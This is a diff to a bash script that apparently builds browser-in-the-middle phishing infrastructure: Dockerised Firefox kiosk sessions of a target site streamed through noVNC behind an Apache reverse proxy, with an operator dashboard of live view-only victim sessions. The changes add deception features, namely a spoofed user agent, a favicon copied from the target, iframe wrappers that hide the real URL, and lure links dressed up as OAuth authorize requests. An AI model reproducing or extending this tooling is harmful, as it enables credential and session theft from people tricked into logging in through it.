@@ -16,7 +16,7 @@
 	   exit 1 # Exit script after printing help
 	}
 	
-	while getopts "u:d:t:s:c:k:e:a:z:" opt
+	while getopts "u:d:t:s:c:k:e:a:z:p:" opt
 	do
 		case "$opt" in
 		u ) User="$OPTARG" ;;
@@ -28,6 +28,7 @@
 		k ) key="$OPTARG" ;;
 		a ) useragent=$OPTARG ;;
 		z ) rzip=$OPTARG ;;
+		p ) param=$OPTARG ;;
 		? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
 		esac
 	done
@@ -91,7 +92,7 @@ case "$1" in
 	START=1
 	END=$User
 	
-	temptitle=$(curl $Target -sL | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
+	temptitle=$(curl $Target -sL -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
 	pagetitle="${temptitle:1}"
 	
 	curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
@@ -117,7 +118,7 @@ case "$1" in
 		RewriteEngine On
     		RewriteMap redirects txt:/tmp/redirects.txt
     		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
-    		RewriteRule ^ ${C:1}? [R=302,L]
+    		RewriteRule ^ ${C:1}? [R=302]
     		
     		<Location /status.php>
 		    Deny from all
@@ -129,7 +130,7 @@ case "$1" in
 		RewriteEngine On
     		RewriteMap redirects txt:/tmp/redirects.txt
     		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
-    		RewriteRule ^ ${C:1}? [R=302,L]
+    		RewriteRule ^ ${C:1}? [R=302]
 		
 		<Location /status.php>
 		    Deny from all
@@ -198,7 +199,7 @@ case "$1" in
       display: none; /* Initially hide the buttons */
       text-decoration: none;
       font-size: 16px; /* Adjust font size as needed */
-      font-family: 'Arial', sans-serif; /* Adjust font family as needed */
+      font-family: "Arial", sans-serif; /* Adjust font family as needed */
       font-weight: bold; /* Adjust font weight as needed */
       border-radius: 5px;
     }
@@ -324,6 +325,7 @@ case "$1" in
 	do
 	    PW=$(openssl rand -hex 14)
 	    AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
+	    Token=$(cat /proc/sys/kernel/random/uuid)
 	    sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker 
 	    sleep 1
 	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
@@ -374,8 +376,93 @@ case "$1" in
 	    sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null
 	    
 	    CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
-	    
+	    if [ -n "$SSL" ]
+	    then
+		echo "
+		<!DOCTYPE html>
+		<html lang='en'>
+		<head>
+		    <meta charset='UTF-8'>
+		    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+		    <link rel='icon' href='https://$Domain/favicon.ico' type='image/x-icon'>
+		    
+		    <title>$pagetitle</title>
+		    
+		    <style>
+			body, html {
+			    height: 100%;
+			    margin: 0;
+			    overflow: hidden;
+			}
+			iframe {
+			    width: 100%;
+			    height: 100%;
+			    border: none;
+			}
+		    </style>
+		    <script>
+			function resizeIframe() {
+			    var iframe = document.getElementById('myIframe');
+			    iframe.style.height = window.innerHeight + 'px';
+			    iframe.style.width = window.innerWidth + 'px';
+			}
 
+			window.onload = function () {
+			    resizeIframe(); // Resize on initial load
+			    window.addEventListener('resize', resizeIframe); // Resize on window resize
+			};
+		    </script>
+		</head>
+		<body>
+		    <iframe id='myIframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
+		</body>
+		</html>
+		" > ./proxy/iframe$c.html
+	    else
+		echo "
+		<!DOCTYPE html>
+		<html lang='en'>
+		<head>
+		    <meta charset='UTF-8'>
+		    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+		    <link rel='icon' href='http://$Domain/favicon.ico' type='image/x-icon'>
+		    <title>$pagetitle</title>
+		    <style>
+			body, html {
+			    height: 100%;
+			    margin: 0;
+			    overflow: hidden;
+			}
+			iframe {
+			    width: 100%;
+			    height: 100%;
+			    border: none;
+			}
+		    </style>
+		    <script>
+			function resizeIframe() {
+			    var iframe = document.getElementById('myIframe');
+			    iframe.style.height = window.innerHeight + 'px';
+			    iframe.style.width = window.innerWidth + 'px';
+			}
+
+			window.onload = function () {
+			    resizeIframe(); // Resize on initial load
+			    window.addEventListener('resize', resizeIframe); // Resize on window resize
+			};
+		    </script>
+		</head>
+		<body>
+		    <iframe id='myIframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
+		</body>
+		</html>
+		" > ./proxy/iframe$c.html
+	    fi
+	    echo "
+	    	RewriteCond %{REQUEST_URI} /v$c
+    		RewriteRule ^/(.*) /iframe$c.html [P]
+	    " >> ./proxy/000-default.conf
+	    
 	    echo "
 		<Location /$PW>
 		ProxyPass http://$CIP:6901
@@ -391,8 +478,8 @@ case "$1" in
 	    printf "[-] Starting containers $c of $END\033[0K\r"
 
 	    
-	if [ -n "$SSL" ]
-	then
+	    if [ -n "$SSL" ]
+	    then
 		echo "
 		    <div class='iframe-wrapper'>
 		      <iframe class='custom-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
@@ -410,8 +497,13 @@ case "$1" in
 		      </form>
 		    </div>		    
 		" >> ./output/status.php
-		urls+=("https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
-	else
+		if [ -n "$param" ]
+		then
+		urls+=("https://$Domain/v$c/$param")
+		else
+		urls+=("https://$Domain/v$c/oauth2/authorize?access-token=$Token")
+		fi
+	    else
 		echo "
 		    <div class='iframe-wrapper'>
 		      <iframe class='custom-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
@@ -429,8 +521,13 @@ case "$1" in
 		      </form>
 		    </div>
 		" >> ./output/status.php
-		urls+=("http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
-	fi
+		if [ -n "$param" ]
+		then
+		urls+=("http://$Domain/v$c/$param")
+		else
+		urls+=("http://$Domain/v$c/oauth2/authorize?access-token=$Token")
+		fi
+	    fi
 	done
 	echo "
 	    </div>
@@ -438,7 +535,7 @@ case "$1" in
 	</html>
         " >> ./output/status.php
 	echo "</VirtualHost>" >> ./proxy/000-default.conf
-        rm -r ./novnc.ico
+
         
         if [ -n "$SSL" ]
 	then
@@ -478,6 +575,11 @@ case "$1" in
 	sudo docker exec rev-proxy /bin/bash -c 'echo "Listen 65534" >> /etc/apache2/ports.conf' 
 	sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
 	sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
+	sudo docker cp ./novnc.ico rev-proxy:/var/www/html/favicon.ico
+	for (( d=$START; d<=$END; d++ ))
+	do
+		sudo docker cp ./proxy/iframe$d.html rev-proxy:/var/www/html/
+	done
 	sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
 	
 	sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
@@ -485,6 +587,7 @@ case "$1" in
         sleep 3
         sudo docker exec rev-proxy /bin/bash -c "crontab"
         sudo docker cp ./output/status.php rev-proxy:/var/www/html/
+        rm -r ./novnc.ico
         printf "[+] Reverse proxy running \033[0K\r\n"  
         	if [ -n "$SSL" ]
 	then
